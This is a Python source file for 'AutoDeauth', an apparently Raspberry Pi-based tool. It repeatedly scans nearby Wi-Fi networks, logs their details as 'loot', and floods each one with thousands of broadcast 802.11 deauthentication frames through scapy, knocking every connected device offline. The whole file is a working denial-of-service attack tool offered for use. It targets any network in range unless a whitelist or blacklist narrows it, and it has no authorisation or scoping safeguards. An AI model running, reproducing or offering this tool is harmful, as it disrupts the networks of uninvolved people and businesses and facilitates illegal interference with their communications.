#!/usr/bin/python3

import os
from typing import Type

if os.geteuid() != 0:
    exit(
        "You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting."
    )

import time, json, logging, sys
import argparse, pathlib
import subprocess, threading

import wifi  # Used to scan for local networks

raspberry_pi = True

try:
    import RPi.GPIO as GPIO  # Used for GPI pin control
except (RuntimeError):
    raspberry_pi = False

from scapy.all import (
    RadioTap,  # Adds additional metadata to an 802.11 frame
    Dot11,  # For creating 802.11 frame
    Dot11Deauth,  # For creating deauth frame
    sendp,  # for sending packets
)



LOG_DIR = "/var/log/autodeauth/"


"""Formats a string

Keyword arguments:
string -- String to format

Return
Formatted string or None if it could not be parsed
"""
format_string = (
    lambda string: None if r"\x00" in string or len(string) == 0 else string.strip()
)
is_interface_valid = lambda interface: os.path.exists(
    f"/sys/class/net/{interface}/operstate"
)

"""
Creates a directory to store the json file

Keyword arguments:
ssid -- ssid to create loot directory for

Return
the filepath for the network
"""
get_loot_file = lambda ssid: f"{LOG_DIR}/loot/{ssid.replace(' ', '')}.json"

LOG_DIR = "/var/log/autodeauth/"


def save_dict_to_json_file(file_path: str, content: dict) -> bool:
    """Saves a python dictionary to a json file

    Keyword arguments:
    file_path -- File path to save the dictionary
    content   -- Dictionary to save

    Return
    False if the file was not saved or parsed
    """
    try:
        with open(file_path, "a+") as json_file:
            json.dump(content, json_file, indent=4)
        return True
    except (TypeError, EnvironmentError):
        return False


class AutoDeauth:
    def __init__(self, **kwargs) -> None:
        """AutoDeauth

        Keyword arguments:
        network_interface -- Interface to run the attack (must support packet injection)
        ssid_blacklist    -- Networks to avoid
        ssid_whitelist    -- Targets to only attack
        led               -- Enable LED Indicators (default: False)

        Return
        False if the file was not saved
        """
        self.network_interface = kwargs.get("interface")
        self.ssid_blacklist = kwargs.get("blacklist")
        self.ssid_whitelist = kwargs.get("whitelist")
        self.deauth_led = kwargs.get("led")
        self.time = kwargs.get("time")
        self.count = kwargs.get("count")
        self.verbose = kwargs.get("verbose")
        self.create_logger()
        if self.deauth_led:
            self.init_gpio_pins()
        self.blink_thread = None
        self.is_done = True

    def init_gpio_pins(self):
        """
        Sets up the selected GPIO pin
        """
        GPIO.setup(self.deauth_led, GPIO.OUT)

    def blink_led(self):
        """
        Thread that blinks the led when deauthing a network
        """
        while not self.is_done:
            GPIO.output(self.deauth_led, GPIO.HIGH)
            time.sleep(0.2)
            GPIO.output(self.deauth_led, GPIO.LOW)
            time.sleep(0.2)
        GPIO.output(self.deauth_led, GPIO.LOW)

    def create_logger(self) -> None:
        """
        Creates a logging object
        """
        self.logger = logging.getLogger("autodeauth")
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter("%(asctime)s - %(message)s", "%Y-%m-%d %H:%M:%S")
        stream_handler = logging.StreamHandler(sys.stdout)
        stream_handler.setFormatter(formatter)
        file_handler = logging.FileHandler(f"{LOG_DIR}/log")
        file_handler.setFormatter(formatter)
        self.logger.addHandler(stream_handler)
        self.logger.addHandler(file_handler)

    def did_os_command_succeed(self, command: str) -> bool:
        """Runs a command and returns true if it worked

        Keyword arguments:
        command -- command to run

        Return
        False if the command did not succeded
        """
        try:
            process: tuple = subprocess.getstatusoutput(command)
            # first item is respsonse code
            if process[0] == 0:
                return True
            return False
        except KeyboardInterrupt:
            self.stop()

    def find_networks(self) -> list:
        """
        Finds local networks around the device

        Return
        A list of wifi.Cell network objects
        """
        networks = []
        try:
            self.collected_networks = set(wifi.Cell.all(self.network_interface))
            for network in self.collected_networks:
                ssid = format_string(network.ssid)
                if not ssid or self.ssid_blacklist and ssid in self.ssid_blacklist:
                    continue
                elif (
                    not self.ssid_whitelist
                    or self.ssid_whitelist
                    and ssid in self.ssid_whitelist
                ):
                    self.save_information(network)
                    networks.append(network)

            return networks

        except wifi.exceptions.InterfaceError:
            self.logger.error(
                f"Ran into an issues with interface: {self.network_interface} restarting interface"
            )
            self.resolve_interface_error()

        except KeyboardInterrupt:
            self.stop()

    def save_information(self, network: wifi.Cell) -> bool:
        """
        Saves the network object to a json file

        Keyword arguments:
        network -- Network object to save

        Return
        False if the file could not be saved
        """
        file_path = get_loot_file(network.ssid)
        json_obj = {
            "ssid": network.ssid,
            "mac_address": network.address,
            "channel": network.channel,
            "network.frequency": network.frequency,
            "mode": network.mode,
            "bitrates": network.bitrates,
            "encryption_type": network.encryption_type,
            "encrypted": network.encrypted,
            "quality": network.quality,
            "signal": network.signal,
        }
        if save_dict_to_json_file(file_path, json_obj):
            return True
        self.logger.error(f"Failed to save {network.ssid} to {file_path}")

    def deauth_network(
        self, bssid_address: str, target_mac_address: str = "ff:ff:ff:ff:ff:ff"
    ) -> bool:
        """
        Saves the network object to a json file

        Keyword arguments:
        bssid_address      --  MAC address of the router to deauth
        target_mac_address --  MAC address of the target device to deauth (default: ff:ff:ff:ff:ff:ff) (ALL)

        Return
        False if the file could not be saved
        """
        try:
            if not self.enable_monitor_mode():
                return False
            self.is_done = False
            if self.deauth_led and raspberry_pi:
                self.blink_thread = threading.Thread(target=self.blink_led)
                self.blink_thread.start()
            dot11 = Dot11(
                addr1=target_mac_address, addr2=bssid_address, addr3=bssid_address
            )
            frame = RadioTap() / dot11 / Dot11Deauth()
            sendp(
                frame,
                iface=self.network_interface,
                count=self.count,
                inter=self.time,
                verbose=self.verbose,
            )
            self.is_done = True
            self.disable_monitor_mode()
            if self.deauth_led and self.blink_thread and raspberry_pi:
                self.blink_thread.join()
            return True
        except KeyboardInterrupt:
            self.stop()

    def enable_monitor_mode(self) -> bool:
        try:
            """
            Sets the network interface into monitor mode
            """
            if not self.did_os_command_succeed(
                f"sudo ifconfig {self.network_interface} down"
            ):
                self.logger.error(f"Failed to set {self.network_interface} down")
                return False
            time.sleep(2)
            if not self.did_os_command_succeed(
                f"sudo iwconfig {self.network_interface} mode monitor"
            ):
                self.logger.error(
                    f"Failed to set {self.network_interface} to monitor mode"
                )
                return False
            time.sleep(2)
            if not self.did_os_command_succeed(
                f"sudo ifconfig {self.network_interface} up"
            ):
                self.logger.error(f"Failed to set {self.network_interface} up")
                return False
            return True
        except KeyboardInterrupt:
            self.stop()

    def disable_monitor_mode(self) -> bool:
        """
        Sets the network interface into managed mode
        """
        try:
            if not self.did_os_command_succeed(
                f"sudo ifconfig {self.network_interface} down"
            ):
                self.logger.error(f"Failed to set {self.network_interface} down")
                return False
            time.sleep(2)
            if not self.did_os_command_succeed(
                f"sudo iwconfig {self.network_interface} mode managed"
            ):
                self.logger.error(f"Failed to set {self.network_interface} to managed")
                return False
            time.sleep(2)
            if not self.did_os_command_succeed(
                f"sudo ifconfig {self.network_interface} up"
            ):
                self.logger.error(f"Failed to set {self.network_interface} up")
                return False
            return True
        except KeyboardInterrupt:
            self.stop()

    def restart_networking_service(self) -> bool:
        """
        Attempts to restart the networking service and the network-manager service
        """
        if not self.did_os_command_succeed(
            "sudo service networking restart"
        ) and not self.did_os_command_succeed("sudo service network-manager restart"):
            self.logger("Failed to restart services: networking, and network-manager")
            return False
        return True

    def restart_network_adapter(self) -> bool:
        """
        Restart the primary network adapter
        """
        try:
            if not self.did_os_command_succeed(
                f"sudo ifconfig {self.network_interface} down"
            ):
                self.logger.error(f"Failed to set {self.network_interface} down")
                return False
            time.sleep(2)
            if not self.did_os_command_succeed(
                f"sudo ifconfig {self.network_interface} up"
            ):
                self.logger.error(f"Failed to set {self.network_interface} up")
                return False
            return True
        except KeyboardInterrupt:
            self.stop()

    def resolve_interface_error(self) -> None:
        """
        Restarts the network adapter and networking service
        """
        self.restart_network_adapter()
        self.restart_networking_service()

    def start_loop(self) -> None:
        """
        Starts the deauth loop
        """
        try:
            self.disable_monitor_mode()
            while True:
                self.logger.info("Scanning for local networks")
                networks = self.find_networks()
                if not networks:
                    continue
                for network in networks:
                    if not network:
                        continue
                    self.logger.info(
                        f"Sending {self.count} deauth frames to network: {network.address} -- {network.ssid}"
                    )
                    if not self.deauth_network(network.address):
                        self.logger.error(
                            f"Failed to deauth {network.address} -- {network.ssid}"
                        )
                time.sleep(5)
        except KeyboardInterrupt:
            self.stop()

    def stop(self) -> None:
        self.logger.info("Exiting/Cleaning up")
        if self.deauth_led and self.blink_thread and raspberry_pi:
            self.is_done = True
            self.blink_thread.join()
        self.disable_monitor_mode()
        if self.deauth_led:
            GPIO.cleanup()
        exit()


if __name__ == "__main__":
    print(
        """
        _       _       ___                _   _    
       /_\ _  _| |_ ___|   \ ___ __ _ _  _| |_| |_  
      / _ \ || |  _/ _ \ |) / -_) _` | || |  _| ' \ 
     /_/ \_\_,_|\__\___/___/\___\__,_|\_,_|\__|_||_|\n"""
    )
    parser = argparse.ArgumentParser(description="Auto Deauth Tool")
    parser.add_argument(
        "--interface",
        "-i",
        help="Interface to snoop WiFi traffic and send deauth packets (must support packet injection) ",
        required=True,
    )
    parser.add_argument(
        "--blacklist",
        "-b",
        help="List of networks ssids to avoid (Comma seperated)",
        type=lambda arg: arg.split(","),
    )
    parser.add_argument(
        "--whitelist",
        "-w",
        help="List of networks ssids to target (Comma seperated)",
        type=lambda arg: arg.split(","),
    )
    parser.add_argument("--led", "-l", help="Led pin number for led display", type=int)
    parser.add_argument(
        "--time",
        "-t",
        help="Time (in s) between two deauth packets (default 0)",
        default=0,
    )
    parser.add_argument(
        "--count",
        "-c",
        help="Number of packets to send (default 5000)",
        type=int,
        default=5000,
    )
    parser.add_argument(
        "--verbose",
        "-v",
        help="Scapy verbose setting (default: 0)",
        type=int,
        default=0,
    )
    args = parser.parse_args()
    data = vars(args)
    if args.led:
        try:
            GPIO.setmode(GPIO.BOARD)
        except NameError:
            print(
                "Unable to setup LED indicator, it doesnt look like you are running a raspberry pi"
            )
            exit()
    if not is_interface_valid(args.interface):
        print(f"{args.interface} is not a valid interface")
        exit()
    a = AutoDeauth(**data)
    a.start_loop()